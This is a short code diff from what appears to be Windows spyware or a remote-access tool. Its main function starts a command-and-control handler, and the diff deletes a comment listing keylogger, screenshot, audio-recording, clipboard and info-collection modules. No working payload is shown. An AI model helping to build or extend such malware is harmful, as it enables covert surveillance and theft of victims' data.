@@ -25,13 +25,6 @@ int main(int argc, char* argv[]) {
     printf("[*] Initializing C2 handler...\n");
     start_c2_handler();
 
-    // TODO: Add manual calls to other modules
-    // - start_audio_recorder()
-    // - start_clipboard_monitor()
-    // - start_info_collector()
-    // - start_keylogger()
-    // - start_screenshot()
-
     // Keep the program running
     while (1) {
         Sleep(1000);
